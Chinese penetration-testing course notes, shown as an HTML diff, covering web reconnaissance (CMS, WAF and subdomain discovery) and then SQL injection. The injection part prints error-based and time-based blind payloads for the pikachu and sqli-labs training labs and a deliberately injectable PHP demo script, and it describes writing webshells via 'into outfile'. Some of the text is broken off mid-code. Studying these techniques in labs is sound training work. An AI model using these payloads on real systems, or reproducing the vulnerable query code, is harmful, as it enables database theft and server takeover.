+<p>DAY-8 信息收集-架构、搭建、WAF等</p>
+<p>2022年7月9日</p>
+<p>14:43</p>
+<p>#CMS 识别技术</p>
+<p>cms框架 使用第三方网站和工具进行识别</p>
+<p>#源码获取技术</p>
+<p>#架构信息获取</p>
+<p>##站点搭建分析</p>
+<h2 id="1-搭建习惯-目录型站点"><a href="#1-搭建习惯-目录型站点" class="headerlink" title="1.搭建习惯-目录型站点"></a>1.搭建习惯-目录型站点</h2><p>目录扫描工具 页面其他功能点——&gt;目录</p>
+<h2 id="2-搭建习惯-端口类站点"><a href="#2-搭建习惯-端口类站点" class="headerlink" title="2.搭建习惯-端口类站点"></a>2.搭建习惯-端口类站点</h2><p>常规端口：80</p>
+<p>其他端口：8080</p>
+<p>端口扫描工具——&gt;端口</p>
+<h2 id="3-搭建习惯-子域名站点"><a href="#3-搭建习惯-子域名站点" class="headerlink" title="3.搭建习惯-子域名站点"></a>3.搭建习惯-子域名站点</h2><p>robots.txt文件</p>
+<p>子域名扫描工具——&gt;子域名</p>
+<h2 id="4-搭建习惯-类似域名站点"><a href="#4-搭建习惯-类似域名站点" class="headerlink" title="4.搭建习惯-类似域名站点"></a>4.搭建习惯-类似域名站点</h2><p>各种常用域名后缀 .com .cn .net .org</p>
+<p>后缀不同</p>
+<h2 id="5-搭建习惯-旁注-C-段站点"><a href="#5-搭建习惯-旁注-C-段站点" class="headerlink" title="5.搭建习惯-旁注,C 段站点"></a>5.搭建习惯-旁注,C 段站点</h2><p>旁注：同一服务器不同站点</p>
+<p>旁注查询工具</p>
+<p>C段：不同服务器不同站点</p>
+<h2 id="6-搭建习惯-搭建软件特征站点"><a href="#6-搭建习惯-搭建软件特征站点" class="headerlink" title="6.搭建习惯-搭建软件特征站点"></a>6.搭建习惯-搭建软件特征站点</h2><p>server回显</p>
+<h1 id="WAF-防护分析"><a href="#WAF-防护分析" class="headerlink" title="#WAF 防护分析"></a>#WAF 防护分析</h1><p>什么是 WAF 应用?</p>
+<p>如何快速识别 WAF？</p>
+<p>识别 WAF 对于安全测试的意义？</p>
+<p>演示案例：</p>
+<p>²  sti.blcu-bbs-目录型站点分析</p>
+<p>²  web.0516jz-8080-端口类站点分析</p>
+<p>²  goodlift-<a href="http://www.bbs-子域名两套/">www.bbs-子域名两套</a> CMS</p>
+<p>²  jmlsd-cn.com.net 等-各种常用域名后缀</p>
+<p>²  weipan-qqyewu-查询靶场同服务器站点</p>
+<p>²  weipan-phpstudy-查询特定软件中间件等</p>
+<p>²  wafw00f-shodan(X-Powered-By: WAF)-147.92.47.120</p>
+<p>涉及资源：</p>
+<p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
+<p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p>
+<p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
+<p>DAY-9 信息收集-APP及其他资产</p>
+<p>2022年7月9日</p>
+<p>14:58</p>
+<ul>
+<li><ul>
+<li>APP 提取一键反编译提取 </li>
+<li>APP 抓数据包进行工具配合 </li>
+<li>各种第三方应用相关探针技术 </li>
+<li>各种服务接口信息相关探针技术</li>
+</ul>
+</li>
+<li></li>
+<li><p>演示案例：</p>
+</li>
+<li><h1 id="APP-提取及抓包及后续配合"><a href="#APP-提取及抓包及后续配合" class="headerlink" title="APP 提取及抓包及后续配合"></a>APP 提取及抓包及后续配合</h1></li>
+<li><ol>
+<li>某  APK  一键提取反编译 </li>
+<li>利用 burp 历史抓更多 URL</li>
+</ol>
+</li>
+<li></li>
+<li></li>
+<li><h1 id="某-IP-无-WEB-框架下的第三方测试"><a href="#某-IP-无-WEB-框架下的第三方测试" class="headerlink" title="某 IP 无 WEB 框架下的第三方测试"></a>某 IP 无 WEB 框架下的第三方测试</h1></li>
+<li><ol>
+<li>各种端口一顿乱扫-思路</li>
+</ol>
+</li>
+<li><p>Nmap -sV ip地址</p>
+</li>
+<li><p>黑暗搜索引擎fofa shodan zoomeye</p>
+</li>
+<li><ol>
+<li>各种接口一顿乱扫-思路</li>
+</ol>
+</li>
+<li><p>提供服务的接口</p>
+</li>
+<li><ol>
+<li>接口部分一顿测试-思路</li>
+</ol>
+</li>
+<li><p>群友 WEB 授权测试下的服务测试</p>
+</li>
+<li><p>不管三七二十一就是扫</p>
+</li>
+<li><p>吃吃瓜，抽抽烟，各种干</p>
+</li>
+<li><p>涉及资源：</p>
+</li>
+<li><p><a href="https://fofa.info/">https://fofa.info/</a></p>
+</li>
+<li><p><a href="http://tool.chinaz.com/">http://tool.chinaz.com</a></p>
+</li>
+<li><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
+</li>
+<li><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
+</li>
+<li><p><a href="https://nmap.org/download.html">https://nmap.org/download.html</a></p>
+</li>
+</ul>
+<p>DAY-10 信息收集-资产监控拓展</p>
+<p>2022年7月9日</p>
+<p>15:03</p>
+<ul>
+<li><ul>
+<li>Github 监控</li>
+</ul>
+</li>
+<li><p>便于收集整理最新 exp 或 poc</p>
+</li>
+<li><p>便于发现相关测试目标的资产</p>
+</li>
+<li><ul>
+<li>各种子域名查询 </li>
+<li>DNS,备案,证书 </li>
+<li>全球节点请求 cdn</li>
+</ul>
+</li>
+<li><p>枚举爆破或解析子域名对应</p>
+</li>
+<li><p>便于发现管理员相关的注册信息</p>
+</li>
+<li><ul>
+<li>黑暗引擎相关搜索</li>
+</ul>
+</li>
+<li><p>fofa，shodan，zoomeye</p>
+</li>
+<li><ul>
+<li>微信公众号接口获取 </li>
+<li>内部群内部应用内部接口</li>
+</ul>
+</li>
+<li><p><img src="/file6280.files/image004.png" alt="img"></p>
+</li>
+<li><h1 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h1></li>
+<li><p>²  监控最新的 EXP 发布及其他</p>
+</li>
+</ul>
+<p>DAY-11 WEB漏洞-必懂知识点</p>
+<p>2022年8月7日</p>
+<p>18:21</p>
+<h1 id="简要知识："><a href="#简要知识：" class="headerlink" title="简要知识："></a>简要知识：</h1><p>CTF，SRC，红蓝对抗，实战等</p>
+<h2 id="简要说明以上漏洞危害情况"><a href="#简要说明以上漏洞危害情况" class="headerlink" title="#简要说明以上漏洞危害情况"></a>#简要说明以上漏洞危害情况</h2><h2 id="简要说明以上漏洞等级划分"><a href="#简要说明以上漏洞等级划分" class="headerlink" title="#简要说明以上漏洞等级划分"></a>#简要说明以上漏洞等级划分</h2><h2 id="简要说明以上漏洞重点内容"><a href="#简要说明以上漏洞重点内容" class="headerlink" title="#简要说明以上漏洞重点内容"></a>#简要说明以上漏洞重点内容</h2><h2 id="简要说明以上漏洞形势问题"><a href="#简要说明以上漏洞形势问题" class="headerlink" title="#简要说明以上漏洞形势问题"></a>#简要说明以上漏洞形势问题</h2><h1 id="案例演示："><a href="#案例演示：" class="headerlink" title="案例演示："></a>案例演示：</h1><h2 id="²-SQL注入漏洞-数据库操作危害"><a href="#²-SQL注入漏洞-数据库操作危害" class="headerlink" title="² SQL注入漏洞-数据库操作危害"></a>² SQL注入漏洞-数据库操作危害</h2><p>闭合sql查询语句</p>
+<h2 id="²-目录遍历漏洞-源码结构泄漏危害"><a href="#²-目录遍历漏洞-源码结构泄漏危害" class="headerlink" title="² 目录遍历漏洞-源码结构泄漏危害"></a>² 目录遍历漏洞-源码结构泄漏危害</h2><p>../../</p>
+<p>首先扫目录 敏感文件</p>
+<p>获取网站目录结构</p>
+<h2 id="²-文件读取漏洞-源码内容获取危害"><a href="#²-文件读取漏洞-源码内容获取危害" class="headerlink" title="² 文件读取漏洞-源码内容获取危害"></a>² 文件读取漏洞-源码内容获取危害</h2><p>获取敏感文件内容</p>
+<h2 id="²-文件上传漏洞-WEB权限丢失危害"><a href="#²-文件上传漏洞-WEB权限丢失危害" class="headerlink" title="² 文件上传漏洞-WEB权限丢失危害"></a>² 文件上传漏洞-WEB权限丢失危害</h2><h2 id="上传一句话木马-shell"><a href="#上传一句话木马-shell" class="headerlink" title="上传一句话木马 shell"></a>上传一句话木马 shell</h2><p>getshell</p>
+<h2 id="²-文件下载漏洞-补充演示拓展演示"><a href="#²-文件下载漏洞-补充演示拓展演示" class="headerlink" title="² 文件下载漏洞-补充演示拓展演示"></a>² 文件下载漏洞-补充演示拓展演示</h2><p>任意文件下载</p>
+<p>DAY-12 WEB漏洞-SQL注入之简易SQL注入</p>
+<p>2022年8月14日</p>
+<p>9:07</p>
+<h1 id="上述思维导图简要说明"><a href="#上述思维导图简要说明" class="headerlink" title="# 上述思维导图简要说明"></a># 上述思维导图简要说明</h1><h1 id="SQL注入安全测试中危害"><a href="#SQL注入安全测试中危害" class="headerlink" title="# SQL注入安全测试中危害"></a># SQL注入安全测试中危害</h1><h1 id="SQL注入产生原理详细分析"><a href="#SQL注入产生原理详细分析" class="headerlink" title="# SQL注入产生原理详细分析"></a># SQL注入产生原理详细分析</h1><p>可控变量、带入数据库查询，变量未存在过滤或过滤不严重</p>
+<h1 id="搭建一个SQL注入学习靶场环境"><a href="#搭建一个SQL注入学习靶场环境" class="headerlink" title="# 搭建一个SQL注入学习靶场环境"></a># 搭建一个SQL注入学习靶场环境</h1><p>Sqli-libs注入靶场</p>
+<h1 id="学习第一个数据库MySql简单注入"><a href="#学习第一个数据库MySql简单注入" class="headerlink" title="# 学习第一个数据库MySql简单注入"></a># 学习第一个数据库MySql简单注入</h1><p>MySQL5.0版本以上存在information_schema数据库，存储所有数据库名，表名，列名的数据库</p>
+<p>Information_schema.tables：记录所有表名信息的表</p>
+<p>Information_schema.columns：记录所有列名信息的表</p>
+<p>SQL  Inject 漏洞攻击流程</p>
+<p>第一步:注入点探测</p>
+<p>自动方式:使用web漏洞扫描工具，自动进行注入点发现</p>
+<p>手动方式:手工构造sq|  inject测试语句进行注入点发现</p>
+<p>第二步:信息获取</p>
+<p>通过注入点取期望得到的数据。</p>
+<p>1.环境信息:数据库类型,数据库版本,操作系统版本,用户信息等。</p>
+<p>2.数据库信息:数据库名称,数据库表，表字段,字段内容(加密内容破解)</p>
+<p>第三步:获取权限</p>
+<p>获取操作系统权限:通过数据库执行shell,上传木马</p>
+<p>Select  version(); //取的数据库版本</p>
+<p>Select  database(); //取得当前的数据库</p>
+<p>Select  user(); //取得当前登录的用户</p>
+<p>order by  X //对查询的结果进行排序,按照第X列进行排序，默认数字0-9 ,字母a-z</p>
+<p>思路:对查询的结果使用order  by按照指定的列进行排序,如果指定的列不存在,数据库会报错。通过报错判断查询结果的列数,从而确定主查询的字段数。</p>
+<h1 id="猜解多个数据可以用limit"><a href="#猜解多个数据可以用limit" class="headerlink" title="猜解多个数据可以用limit"></a>猜解多个数据可以用limit</h1><h1 id="案例演示：-1"><a href="#案例演示：-1" class="headerlink" title="案例演示："></a>案例演示：</h1><h2 id="²-简易代码分析-SQL-注入原理"><a href="#²-简易代码分析-SQL-注入原理" class="headerlink" title="² 简易代码分析 SQL 注入原理"></a>² 简易代码分析 SQL 注入原理</h2><h2 id="²-Sqlilabs-注入靶场搭建简要使用"><a href="#²-Sqlilabs-注入靶场搭建简要使用" class="headerlink" title="² Sqlilabs 注入靶场搭建简要使用"></a>² Sqlilabs 注入靶场搭建简要使用</h2><h2 id="²-墨者靶机真实-MYSQL-注入演示"><a href="#²-墨者靶机真实-MYSQL-注入演示" class="headerlink" title="² 墨者靶机真实 MYSQL 注入演示"></a>² 墨者靶机真实 MYSQL 注入演示</h2><p>判断注入点</p>
+<p>猜列名数量 字段数 order by</p>
+<p>信息收集：</p>
+<p>数据库版本： version()</p>
+<p>数据库名：database（）</p>
+<p>数据库用户：user()</p>
+<p>操作系统：@@</p>
+<h1 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h1><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
+<p>QQ 群文件-忍者安全测试系统-<strong>禁用软盘安装</strong>  <strong>100G</strong></p>
+<p><a href="https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe"><strong>https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozh****e</strong></a></p>
+<p>DAY-13 WEB漏洞-SQL注入之MySQL注入</p>
+<p>2022年8月17日</p>
+<p>11:41</p>
+<p><img src="/file6280.files/image008.png" alt="img"></p>
+<h1 id="高权限注入及低权限注入"><a href="#高权限注入及低权限注入" class="headerlink" title="高权限注入及低权限注入"></a>高权限注入及低权限注入</h1><p>MYSQL  注入中首先要明确当前注入点权限，高权限注入时有更多的</p>
+<p>攻击手法，有的能直接进行 getshell 操作.</p>
+<p>root权限、普通用户权限</p>
+<p>高权限用户可以实现跨库sql注入</p>
+<h1 id="跨库查询及应用思路"><a href="#跨库查询及应用思路" class="headerlink" title="#跨库查询及应用思路"></a>#跨库查询及应用思路</h1><p>information_schema  表特性，记录库名，表名，列名对应表</p>
+<p>group_concat(）显示所有字段</p>
+<p>数据库名.表名 限制在数据库中查询</p>
+<h1 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="#文件读写操作"></a>#文件读写操作</h1><p>load_file()：读取函数</p>
+<p>into  outfile 或 into dumpfile ：导出函数</p>
+<p>直接写入，上传一句话木马</p>
+<p>– + 注释</p>
+<h2 id="路径获取常见方法："><a href="#路径获取常见方法：" class="headerlink" title="路径获取常见方法："></a>路径获取常见方法：</h2><p>报错注入，遗留文件，漏洞报错，平台配置文件，爆破等</p>
+<h2 id="常见读取文件列表："><a href="#常见读取文件列表：" class="headerlink" title="常见读取文件列表："></a>常见读取文件列表：</h2><h2 id="常见写入文件问题："><a href="#常见写入文件问题：" class="headerlink" title="常见写入文件问题："></a>常见写入文件问题：</h2><p>魔术引号开关</p>
+<p>magic_quotes_gpc：off/on</p>
+<p>若magic_quotes_gpc开启，可以通过Hex编码或宽字节绕过</p>
+<p>因为编码可以不使用单引号，绕过防护机制</p>
+<h1 id="魔术引号及常见防护"><a href="#魔术引号及常见防护" class="headerlink" title="#魔术引号及常见防护"></a>#魔术引号及常见防护</h1><p>自带防御：魔术引号</p>
+<p>内置函数：is_int、is_array等</p>
+<p>自定义关键字过滤：select过滤等  str_replace(‘select’,’xx’,$id)</p>
+<p>WAF防护软件：安全狗、宝塔等</p>
+<h1 id="低版本注入配合读取或暴力"><a href="#低版本注入配合读取或暴力" class="headerlink" title="#低版本注入配合读取或暴力"></a>#低版本注入配合读取或暴力</h1><p>字典或读取</p>
+<p>爆破数据库名 表名</p>
+<h1 id="演示案例：-1"><a href="#演示案例：-1" class="headerlink" title="演示案例："></a>演示案例：</h1><p>² 普通用户及  root 用户操作权限</p>
+<p>²  高权限注入跨库查询操作测试</p>
+<p>²  高权限注入文件读写操作测试</p>
+<p>²  魔术引号开启后相关操作测试</p>
+<p>²  相关自定义代码过滤操作测试</p>
+<p>涉及资源：</p>
+<p><a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p>
+<p>DAY-14 WEB漏洞-SQL注入之类型及提交注入</p>
+<p>2022年8月7日</p>
+<p>18:24</p>
+<p>在真实 SQL 注入安全测试中，我们一定要先明确提交数据及提交方</p>
+<p>法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取，</p>
+<p>后续安全测试中我们也必须满足同等的操作才能进行注入。</p>
+<h1 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="#简要明确参数类型"></a>#简要明确参数类型</h1><p>数字，字符，搜索，json型等</p>
+<p>字符型:   需要闭合引号,还可能含有括号</p>
+<p>搜索型： LIKE ‘%xx%’</p>
+<h1 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="#简要明确请求方法"></a>#简要明确请求方法</h1><p>GET,POST,COOKIE,REQUEST,HTTP  头等</p>
+<p>其中 SQL  语句干扰符号：**’,”,%,),}**等，具体需看写法</p>
+<h1 id="演示案例：-2"><a href="#演示案例：-2" class="headerlink" title="演示案例："></a>演示案例：</h1><p>²  参数字符型注入测试=&gt;sqlilabs less 5 6</p>
+<p>?id=1’  and ‘1’=’1</p>
+<p>² POST  数据提交注入测试=&gt;sqlilabs less 11</p>
+<p> –+</p>
+<p> #</p>
+<p>² 参数  JSON 数据注入测试=&gt;本地环境代码演示</p>
+<p>² COOKIE  数据提交注入测试=&gt;sqlilabs less 20</p>
+<p>² HTTP  头部参数数据注入测试=&gt;sqlilabs less 18</p>
+<h1 id="演示资源："><a href="#演示资源：" class="headerlink" title="演示资源："></a>演示资源：</h1><p>#配合  sqlilabs 本地数据库演示</p>
+<!--?php
+
+header('content-type:text/html;charset=utf-8');
+
+if(isset($_POST['json'])){
+
+$json_str=$_POST['json'];
+
+$json=json_decode($json_str);
+
+if(!$json){
+
+die('JSON  文档格式有误，请检查');
+
+}
+
+$username=$json--->username;
+
+//$passwd=$json-&gt;passwd;
+
+$mysqli=new  mysqli();
+
+$mysqli-&gt;connect('localhost','root','root');
+
+if($mysqli-&gt;connect_errno){
+
+die('数据库连接失败：'.$mysqli-&gt;connect_error);
+
+}
+
+$mysqli-&gt;select_db('security');
+
+if($mysqli-&gt;errno){
+
+dir('打开数据库失败：'.$mysqli-&gt;error);
+
+}
+
+$mysqli-&gt;set_charset('utf-8');
+
+$sql="SELECT  * FROM users WHERE username='{$username}'";
+
+echo  $sql;
+
+$result=$mysqli-&gt;query($sql);
+
+if(!$result){
+
+die('执行  SQL 语句失败：'.$mysqli-&gt;error);
+
+}else  if($result-&gt;num_rows==0){
+
+die('查询结果为空');
+
+}else  {
+
+$array1=$result-&gt;fetch_all(MYSQLI_ASSOC);
+
+echo  "用户名：{$array1[0]['username']},密码：{$array1[0]['password']}";
+
+}
+
+$result-&gt;free();
+
+$mysqli-&gt;close();
+
+}
+
+?&gt;
+
+<p>DAY-15 WEB漏洞-SQL注入之Oracle,MongoDB等注入</p>
+<p>2022年8月7日</p>
+<p>18:24</p>
+<p>Root用户-高权限</p>
+<p>普通用户-低权限</p>
+<p>自带系统信息的数据库</p>
+<h1 id="各种数据库类型"><a href="#各种数据库类型" class="headerlink" title="# 各种数据库类型"></a># 各种数据库类型</h1><p>Access，mysql，mssql，mongoDB，postgresql，sqlite，Oracle，Sybase等</p>
+<p>Access .mdb </p>
+<p>没有数据库库名这一级  缺少许多内置功能，例如文件读写</p>
+<p>表名-列名-数据</p>
+<p>Msql，mssql</p>
+<p>库名-表名-列名-数据</p>
+<h2 id="JSON注入类型"><a href="#JSON注入类型" class="headerlink" title="JSON注入类型"></a>JSON注入类型</h2><p>数据包以json数组的形式发送，需要在值上进行注入，不需要闭合json语法的引号</p>
+<h1 id="简要学习各种数据库的注入特点"><a href="#简要学习各种数据库的注入特点" class="headerlink" title="#简要学习各种数据库的注入特点"></a>#简要学习各种数据库的注入特点</h1><p>数据库架构组成，数据库高权限操作</p>
+<h1 id="简要学习各种注入工具的使用指南"><a href="#简要学习各种注入工具的使用指南" class="headerlink" title="#简要学习各种注入工具的使用指南"></a>#简要学习各种注入工具的使用指南</h1><p>熟悉工具的<strong>支持库，注入模式，优缺点</strong>等</p>
+<p>sqlmap，NoSQLAttack，Pangolin等</p>
+<p>access注入时，表名，列名需要猜</p>
+<p>涉及资源:</p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a> <a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a></p>
+<p><a href="https://github.com/sqlmapproject/sqlmap/zipball/master">https://github.com/sqlmapproject/sqlmap/zipball/master</a> <a href="https://blog.csdn.net/qq_39936434/category_9103379.html">https://blog.csdn.net/qq_39936434/category_9103379.html</a></p>
+<p>DAY-16 WEB漏洞-SQL注入之查询方式及报错盲注</p>
+<p>2022年8月7日</p>
+<p>18:25</p>
+<p>当进行 SQL 注入时，有很多注入会出现无回显的情况，其中不回显</p>
+<p>的原因可能是 SQL 语句查询方式的问题导致，这个时候我们需要用到相</p>
+<p>关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其</p>
+<p>SQL  语句大概写法也能更好的选择对应的注入语句。</p>
+<p> 涉及知识点：</p>
+<p>#补充：上课的 Access 暴力猜解不出的问题？</p>
+<p>Access  偏移注入：解决<strong>列名</strong>获取不到的情况</p>
+<p>查看登陆框源代码的表单值或观察 URL 特征等也可以针对表或列获取不到的情况</p>
+<h1 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h1><h2 id="select-查询数据"><a href="#select-查询数据" class="headerlink" title="select 查询数据"></a>select 查询数据</h2><p>在网站应用中进行数据显示查询操作</p>
+<p>例：select * from news where id=$id</p>
+<h2 id="insert-插入数据"><a href="#insert-插入数据" class="headerlink" title="insert 插入数据"></a>insert 插入数据</h2><p>在网站应用中进行用户注册添加等操作</p>
+<p>例：insert into news(id,url,text)  values(2,’x’,’$t’)</p>
+<h2 id="delete-删除数据"><a href="#delete-删除数据" class="headerlink" title="delete 删除数据"></a>delete 删除数据</h2><p>后台管理里面删除文章删除用户等操作</p>
+<p>例：delete from news where id=$id</p>
+<h2 id="update-更新数据"><a href="#update-更新数据" class="headerlink" title="update 更新数据"></a>update 更新数据</h2><p>会员或后台中心数据同步或缓存等操作</p>
+<p>例：update user set pwd=’$p’ where id=2 and  username=’admin’</p>
+<h2 id="order-by-排序数据"><a href="#order-by-排序数据" class="headerlink" title="order by 排序数据"></a>order by 排序数据</h2><p>一般结合表名或列名进行数据排序操作</p>
+<p>例：select * from news order by $id</p>
+<p>例：select id,name,price from news order by  $order</p>
+<p> 重点理解：</p>
+<p><strong>我们可以通过以上查询方式与网站应用的关系</strong></p>
+<p><strong>注入点产生地方或应用猜测到对方的</strong> <strong>SQL</strong> <strong>查询方式</strong></p>
+<p>SQL 注入报错盲注</p>
+<p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
+<p>基于布尔的 SQL 盲注-逻辑判断</p>
+<p>regexp,like,ascii,left,ord,mid</p>
+<p>基于时间的 SQL 盲注-延时判断</p>
+<p>if,sleep</p>
+<p>基于报错的 SQL 盲注-报错回显</p>
+<p>floor，updatexml，extractvalue</p>
+<p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
+<p>参考：</p>
+<p>**like ‘ro%’ #**<strong>判断</strong> <strong>ro</strong> <strong>或</strong> **ro…**<strong>是否成立</strong></p>
+<p>**regexp ‘^xiaodi[a-z]’  #**<strong>匹配</strong> <strong>xiaodi</strong> <strong>及</strong> **xiaodi…**<strong>等</strong></p>
+<p>**if(<strong><strong>条件</strong></strong>,5,0) #**<strong>条件成立 返回</strong> <strong>5</strong> <strong>反之 返回</strong> <strong>0</strong></p>
+<p><strong>sleep(5) #SQL</strong> <strong>语句延时执行</strong> <strong>5</strong> <strong>秒</strong></p>
+<p>**mid(a,b,c) #**<strong>从位置</strong> <strong>b</strong> <strong>开始，截取</strong> <strong>a</strong> <strong>字符串的</strong> <strong>c</strong> <strong>位</strong></p>
+<p>**substr(a,b,c) #**<strong>从</strong> <strong>b</strong> <strong>位置开始，截取字符串</strong> <strong>a</strong> <strong>的</strong> <strong>c</strong> <strong>长度</strong></p>
+<p>**left(database(),1)<strong><strong>，</strong></strong>database()  #left(a,b)**<strong>从左侧截取</strong> <strong>a</strong> <strong>的前</strong> <strong>b</strong> <strong>位</strong></p>
+<p>**length(database())=8  #**<strong>判断数据库</strong> **database()**<strong>名的长度</strong></p>
+<p>**ord=ascii ascii(x)=97  #**<strong>判断</strong> <strong>x</strong> <strong>的</strong> <strong>ascii</strong> <strong>码是否等于</strong> <strong>97</strong></p>
+<p> 演示案例：</p>
+<h2 id="²-各种查询方式注入测试（报错盲注"><a href="#²-各种查询方式注入测试（报错盲注" class="headerlink" title="² 各种查询方式注入测试（报错盲注)"></a>² 各种查询方式注入测试（报错盲注)</h2><h2 id="²-sqlilabs-less5-注入测试（布尔盲注）"><a href="#²-sqlilabs-less5-注入测试（布尔盲注）" class="headerlink" title="² sqlilabs-less5 注入测试（布尔盲注）"></a>² sqlilabs-less5 注入测试（布尔盲注）</h2><h2 id="²-sqlilabs-less2-注入测试（延时盲注）"><a href="#²-sqlilabs-less2-注入测试（延时盲注）" class="headerlink" title="² sqlilabs-less2 注入测试（延时盲注）"></a>² sqlilabs-less2 注入测试（延时盲注）</h2><h2 id="²-sqlilabs-less46-注入测试（排序盲注）"><a href="#²-sqlilabs-less46-注入测试（排序盲注）" class="headerlink" title="² sqlilabs-less46 注入测试（排序盲注）"></a>² sqlilabs-less46 注入测试（排序盲注）</h2><p> Payload:</p>
+<h2 id="pikachu-insert"><a href="#pikachu-insert" class="headerlink" title="pikachu  insert"></a>pikachu  insert</h2><p>username=x’ or(select 1 from(select  count(*),concat((select (select (select concat(0x7e,database(),0x7e)))</p>
+<p>from information_schema.tableslimit 0,1),floor(rand(0)*2))x from  information_schema.tables group by x)a) or ‘ &amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit</p>
+<p>username=x’ or  updatexml(1,concat(0x7e,(version())),0)  or</p>
+<p>‘&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit</p>
+<p>username=x’ or  extractvalue(1,concat(0x7e,database()))  or</p>
+<p>‘&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit</p>
+<h2 id="pikachu-update"><a href="#pikachu-update" class="headerlink" title="pikachu  update"></a>pikachu  update</h2><p>sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=hubeNicky’  or (select 1 from(select</p>
+<p>count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from  information_schema.character_sets group by x)a) or ‘&amp;email=wuhan&amp;submit=submit</p>
+<p>sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=hubeNicky’  or </p>
+<p>updatexml(1,concat(0x7e,(version())),0)  or ‘&amp;email=wuhan&amp;submit=submit</p>
+<p>sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=Nicky’ or extractvalue(1,concat(0x7e,database()))  or ‘&amp;email=wuhan&amp;submit=submit</p>
+<h2 id="pikachu-delete"><a href="#pikachu-delete" class="headerlink" title="pikachu  delete"></a>pikachu  delete</h2><p>/pikachu/vul/sqli/sqli_del.php?id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)</p>
+<p>pikachu/vul/sqli/sqli_del.php?id=56+or+updatexml+(1,concat(0x7e,database()),0)</p>
+<p>/pikachu/vul/sqli/sqli_del.php?id=56+or+extractvalue(1,concat(0x7e,database()))</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="延时盲注："><a href="#延时盲注：" class="headerlink" title="延时盲注："></a>延时盲注：</h2><p><strong>and  if(ascii(substr(database(),1,1))=115,sleep(5),1)–+</strong></p>
+<p><strong>and if(ascii(substr((select table_name from  information_schema.tables where table_schema=database()</strong> <strong>limit 0,1),1,1))=101,sleep(3),0)–+</strong></p>
+<h1 id="涉及资源：-1"><a href="#涉及资源：-1" class="headerlink" title="涉及资源："></a>涉及资源：</h1><p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
+<p><a href="https://www.jianshu.com/p/fcae21926e5c">https://www.jianshu.com/p/fcae21926e5c</a></p>
+<p><a href="https://pan.baidu.com/s/1IX6emxDpvYrVZbQzJbHn3g">https://pan.baidu.com/s/1IX6emxDpvYrVZbQzJbHn3g</a> 提取码：l9f6</p>
+<p>腾讯文档-与我共享-Sqlilabs 过关手册注入天书.pdf</p>
+<p>insert 注入练习-小迪渗透吧</p>
+<pre class="line-numbers language-none"><code class="language-none">编号：&lt;input type='text'  name='i'&gt;&lt;br&gt;
+帐号：&lt;input type='text'  name='u'&gt;&lt;br&gt;
+密码：&lt;input type='text'  name='p'&gt;&lt;br&gt;
+&lt;input type='submit' value='添加'&gt;&lt;br&gt;
+&lt;/form&gt;
+&lt;form action=''  method='get'&gt;
+delete 注入练习-小迪渗透吧&lt;br&gt;
+
+&lt;form action=''  method='post'&gt;
+
+编号：&lt;input type='text'  name='i'&gt;&lt;br&gt;
+
+&lt;input type='submit' value='删除'&gt;&lt;br&gt;
+
+&lt;/form&gt;
+
+update 注入练习-小迪渗透吧&lt;br&gt;
+
+&lt;form action=''  method='post'&gt;
+
+帐号：&lt;input type='text'  name='user'&gt;&lt;br&gt;
+
+密码：&lt;input type='text'  name='pass'&gt;&lt;br&gt;
+
+&lt;input type='submit' value='更新'&gt;&lt;br&gt;
+
+&lt;/form&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<!--?php
+
+//小迪渗透吧-培训专用代码-www.xiaodi8.com
+
+header("Content-Type:  text/html;charset=utf-8");
+
+echo  '<hr-->';
+
+//insert 代码块
+
+$id=@$_GET['i'];
+
+ 
+
+DAY-17 WEB漏洞-SQL注入之二次,加解密,DNS等注入
+
+2022年8月20日
+
+15:41
+
+# #加解密，二次，DNSlog 注入
+
+注入原理，演示案例，实际应用（中转注入）
+
+Base64加解密 加解密注入
+
